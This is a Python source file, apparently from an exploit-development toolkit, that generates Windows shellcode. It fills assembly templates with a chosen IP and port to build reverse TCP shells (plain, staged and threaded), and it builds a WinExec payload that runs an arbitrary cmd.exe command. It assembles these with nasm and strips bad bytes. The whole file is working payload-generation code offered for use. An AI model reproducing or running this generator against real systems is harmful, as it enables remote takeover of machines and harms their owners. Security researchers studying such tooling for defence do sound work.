'''
A Library to work around shellcodes.
-class SHELLCODE
-LibShellcode.SHELLCODE ReadSHELLCODE(inputFile: str)
-LibShellcode.SHELLCODE GenerateCDRTShell(Ip: str, Port: str)
-LibShellcode.SHELLCODE GenerateCDRTS()
-LibShellcode.SHELLCODE GenerateCDRTTShell()
-LibShellcode.SHELLCODE GenerateWinExec(command: str)
'''
from SRC.Core import Globals
from SRC.Libs import LibDebug
import sys
import binascii
import os
import re

class SHELLCODE:
        '''
        SHELLCODE Class.
        -string GetShellcode()
        '''
        def __init__(self):
            self.opcodes = []

        def GetShellcode(self):
            '''
            return shellcode parsed string
            -return: string
            '''
            shellcode = ""
            for opcode in self.opcodes:
                shellcode += opcode
            return shellcode


def ReadSHELLCODE(inputFile: str):
    '''
    Read one ASM file and return a SHELLCODE object
    -return SHELLCODE
    '''

    if Globals.Env.ARCH == "AMD64":
        os.system("nasm -f elf64 " + inputFile + " -o shellcode.o & ld -o shellcode shellcode.o & objdump -d shellcode > shellcode.sc")
    else:
        os.system("nasm -f elf " + inputFile + " -o shellcode.o & ld -o shellcode shellcode.o & objdump -d shellcode > shellcode.sc")

    unparsed_shellcode = ""
    shellcode = SHELLCODE()
    with open("shellcode.sc", 'r') as fc:
        unparsed_shellcode = fc.readlines()
    os.system("rm shellcode*")
    for line in unparsed_shellcode:
        line = line.split('\t')
        if len(line) == 3:
            shellcode.opcodes.append(line[1].replace(" ", ""))
    BadEnd = True
    while BadEnd:
        if shellcode.opcodes[len(shellcode.opcodes)-1] == "0000" or shellcode.opcodes[len(shellcode.opcodes)-1] == "00" or shellcode.opcodes[len(shellcode.opcodes)-1] == "ff" or shellcode.opcodes[len(shellcode.opcodes)-1] == "ff00" or shellcode.opcodes[len(shellcode.opcodes)-1] == "00ff" or shellcode.opcodes[len(shellcode.opcodes)-1] == "ffff":
            shellcode.opcodes.pop(len(shellcode.opcodes)-1)
        else:
            BadEnd = False
    return shellcode


def GenerateCDRTShell(Ip: str, Port: str):
    '''
    Generate a Dynamic Reverse TCP Staged shellcode.
    -return string
    '''
    HexIp = LibDebug.IpToHex(Ip)
    HexPort = LibDebug.PortToHex(Port)
    Content = ""
    with open("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_ReverseTCP_Shell.asm", mode='r+') as f:
        Content = f.read()
    NullByteTrigger = False
    for i in range(0, len(HexIp), 2):
        if HexIp[i:i+2] == "00":
            NullByteTrigger = True
            break
    if NullByteTrigger:
            HexIp = str(hex(int("ffffffff", 16) - int(HexIp, 16)))[2:]
            HexPort = str(hex(int("ffff", 16) - int(HexPort, 16)))[2:]
            Content = Content.replace(
                'sub ebx, 0xfeffff80 ; HEAPNOS03 IP', "sub ebx, 0x" + HexIp + "; HEAPNOS03 IP")
            Content = Content.replace(
                'sub bx, 0x47DD ; HEAPNOS07 PORT', "sub bx, 0x" + HexPort + "; HEAPNOS07 PORT")
    else:
        for i in range(0, len(Content)):
            Content = Content.replace('xor ebx,ebx ; HEAPNOS01', "; HEAPNOS01")
            Content = Content.replace(
                'mov ebx, 0xffffffff ; HEAPNOS02', "; HEAPNOS02")
            Content = Content.replace(
                'sub ebx, 0xfeffff80 ; HEAPNOS03', "; HEAPNOS03")
            Content = Content.replace('push ebx ; HEAPNOS04', "; HEAPNOS04")
            Content = Content.replace('xor ebx,ebx ; HEAPNOS05', "; HEAPNOS05")
            Content = Content.replace(
                'mov ebx, 0xffffffff ; HEAPNOS06', "; HEAPNOS06")
            Content = Content.replace(
                'sub bx, 0x47DD ; HEAPNOS07 PORT', "; HEAPNOS07")
            Content = Content.replace('push bx ; HEAPNOS08', "; HEAPNOS08")
            Content = Content.replace('; HEAPNOS09', "push 0x" + HexIp)
            Content = Content.replace('; HEAPNOS10', "push word 0x" + HexPort)
    File = open("shellcode.asm", "w+")
    File.write(Content)
    File.close()
    return ReadSHELLCODE("shellcode.asm")


def GenerateCDRTS():
    '''
    Generate a Dynamic Reverse TCP Staged shellcode.
    -return string
    '''
    return ReadSHELLCODE("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_ReverseTCP_Staged.asm")


def GenerateCDRTTShell():
    '''
    Generate a Dynamic Reverse TCP Threaded Shell shellcode.
    -return string
    '''
    return ReadSHELLCODE("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_ReverseTCP_Threaded_Shell.asm")


def GenerateWinExec(command: str):
    '''
    Generate a WinExec("cmd.exe /C {command}") shellcode.
    -return string
    '''
    command = "\"" + command + "\""
    HexCommand = LibDebug.StringToHex(LibDebug.RevertString(command))
    ParsedHexCommand = ""
    while len(HexCommand) % 8 != 0:
        HexCommand = "20" + HexCommand
    ebyte = ""
    for nibble in HexCommand:
        ebyte += nibble
        if len(ebyte) == 8:
            ParsedHexCommand += "push 0x" + ebyte + " ;" + \
                bytearray.fromhex(ebyte).decode()+"\n"
            ebyte = ""
    Content = ""
    with open("ASM/ShellCodes/Windows/" + Globals.Env.ARCH + "/Custom_Dynamic_WinExec.asm", mode='r+') as f:
        Content = f.read()
    for _ in range(0, len(Content)):
        if 'push 0x636c6163 ; HEAPNOS' in Content:
            Content = Content.replace(
                'push 0x636c6163 ; HEAPNOS', ParsedHexCommand)            
    
    File = open("shellcode.asm", "w+")
    File.write(Content)
    File.close()
    return ReadSHELLCODE("shellcode.asm")
